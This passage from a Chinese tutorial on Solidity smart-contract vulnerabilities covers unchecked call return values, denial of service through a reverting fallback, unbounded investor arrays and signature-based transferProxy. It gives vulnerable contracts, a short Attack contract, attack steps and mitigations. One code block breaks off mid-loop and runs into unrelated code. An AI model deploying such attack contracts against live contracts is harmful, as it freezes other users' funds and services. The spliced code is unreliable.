攻击步骤：
1.account A 部署 Alice合约。
2.account B 部署 Bob合约--- 这里只是尽量模拟真实的环境，用哪个 account部署并不影响结果。
3.调用 Bob 合约的 ping1 方法，参数传入 Alice 合约的地址。若发生异常，log则可以看到调用失败。
4.此时观察 Alice 合约的 n 值，值为 0，说明 Alice 合约内发生的操作被 revert。再观察 Bob 合约 x 的值，值为 0
，表示所有的操作都被 revert。符合预期。
5.调用 Bob 合约的 ping2 方法，参数传入 Alice 合约的地址。尽管发生异常，log 不会直接显示调用失败。
6.此时观察 Alice 合约的 n 值，值为 0，说明 Alice 合约内发生的操作被 revert。再观察 Bob 合约 y 的值，值为 4 ，表示
Bob 合约的操作没有被 revert。不符合预期，会产生逻辑上的混乱。
**规避建议**
1.如果想要发生异常之后，revert 所有的操作，推荐使用直接调用的方式。
2.如果有充分的理由不能使用直接调用的方式，需要严格判断 call 函数的返回值，并做相应的处理。
### **DoS 漏洞**
拒绝服务漏洞是一种常见的漏洞。其攻击形式多种多样，攻击的目的是让用户短暂的或永久的不能使用合约提供的服务，包括利用的漏洞类型也多种多样。
#### **king of ether 代表的 DoS 漏洞类型**
**这种 DoS 漏洞类型是：依赖外部调用的进展，如果外部调用执行失败，后续的操作也就无法执行，导致拒绝服务。**
**漏洞介绍**
King of the Ether Throne 是一个竞选国王的合约游戏，游戏规则是如果新玩家发送的 ETH 数量大于当前指定的 price
的数量，合约就向上一个国王发送 price 数量的 ETH，新玩家就会成为新的国王，然后合约把 price 调的更高一些，等待下一位国王。
**漏洞示例**
    pragma solidity ^0.4.10;
    contract PresidentOfCountry {
        address public president;
        uint256 price;
        function PresidentOfCountry(uint256 _price) {
            require(_price > 0);
            price = _price;
            president = msg.sender;
        }
        function becomePresident() payable {
            require(msg.value >= price); // must pay the price to become president
            president.transfer(price);   // we pay the previous president
            president = msg.sender;      // we crown the new president
            price = price * 2;           // we double the price to become president
        }
    }
**攻击示例**
攻击代码：
    contract Attack {
        function () { revert(); }
        function Attack(address _target) payable {
            _target.call.value(msg.value)(bytes4(keccak256("becomePresident()")));
        }
    }
攻击步骤：
1.account A 发布合约，指定初始 price。
2.account B 发布 Attack 合约，指定攻击目标地址，和存入大于当前 price 的 ether，保证 Attack 合约能够成为
president。
3.此后任何账户如果试图成为 president ，会触发转币给 Attack 合约的 fallback 函数。也就是会调用
revert()；导致转币失败。如此就会阻止其他账户成为 president。
**规避建议**
采用“取回”模式发送币，让之前发送的人自己取回币。这样取回的人就不能作恶，否则就会失去代币。
示例代码：
      function withdraw() public {
            uint amount = pendingWithdrawals[msg.sender];
            // 记住，在发送资金之前将待发金额清零
            // 来防止重入（re-entrancy）攻击
            pendingWithdrawals[msg.sender] = 0;
            msg.sender.transfer(amount);
        }
#### **GovernMental 骗局代表的 DoS 漏洞类型**
**这种 DoS 漏洞类型是：依赖外部可以操作的数据，如数组或映射，如果外部操作改变了数据，修改后的数据使得后续的操作无法执行，导致拒绝服务。**
**漏洞介绍**
GovernMental 是一个类似庞氏骗局的游戏合约。游戏规则是债权人（玩家）至少投入 1 ETH 参与游戏，债权人有望获得 1ETH + 10% 利息。
发送给合同的 ETH
是这样分配的：5％分配给头奖，5％分配给管理政府的腐败精英（合同所有者），90％用来按信用日期顺序偿还债权人。如果“政府”（合同）在12个小时内未收到新钱，则最新的债权人将获得头奖，其他所有债权人将失去其债权。
**漏洞示例**
合约所有者希望在投资者之间分配代币。
    contract DistributeTokens {
        address public owner; // gets set somewhere
        address[] investors; // array of investors
        uint[] investorTokens; // the amount of tokens each investor gets
        // ... extra functionality, including transfertoken()
        function invest() public payable {
            investors.push(msg.sender);
            investorTokens.push(msg.value * 5); // 5 times the wei sent
            }
        function distribute() public {
            require(msg.sender == owner); // only owner
            for(uint i = 0; i  _fee + _value) revert();
        uint256 nonce = nonces[_from];
        bytes32 h = keccak256(_from,_to,_value,_fee,nonce,address(this));
        if(_from != ecrecover(h,_v,_r,_s)) revert();
        if(balances[_to] + _value < balances[_to]
            || balances[msg.sender] + _fee < balances[msg.sender]) revert();
        balances[_to] += _value;
        emit Transfer(_from, _to, _value);
        balances[msg.sender] += _fee;
        emit Transfer(_from, msg.sender, _fee);
        balances[_from] -= _value + _fee;
        nonces[_from] = nonce + 1;
        return true;
    }
函数中关键的点是keccak256和ecrecover，即椭圆曲线加密数字签名(ECDSA)函数和验签函数，keccak256等同于sha3。
**如下是签名、验签过程：**
角色1(from)先用sha3函数对
from,to,value,_fee,nonce,address(token)进行处理得到msg值，然后使用web3.eth.sign(address,
msg)得到签名signature；
将signature取前 0~66 个字节作为 r， 66~130 之间的字节作为 s，130~132 的字节作为 v，然后把 v
转为整型，角色1把这些信息告知角色2，角色2调用合约的transferProxy进行转账；
合约内ecrecover接收签名数据的哈希值以及 r/s/v 等参数作为输入，返回实施该签名的账户地址；
校验步骤3中得到的账户地址与 _from 是否匹配；
    let msg = web3.sha3(_from,_to,_value,_fee,nonce,address(token))
    let signature = web3.eth.sign(_from, msg)
    let r = signature.slice(0, 66)
    let s = '0x' + signature.slice(66, 130)
    let v = '0x' + signature.slice(130, 132)
    v = web3.toDecimal(v)
    console.log('r', r)
    console.log('s', s)
    console.log('v', v)
    console.log(msg)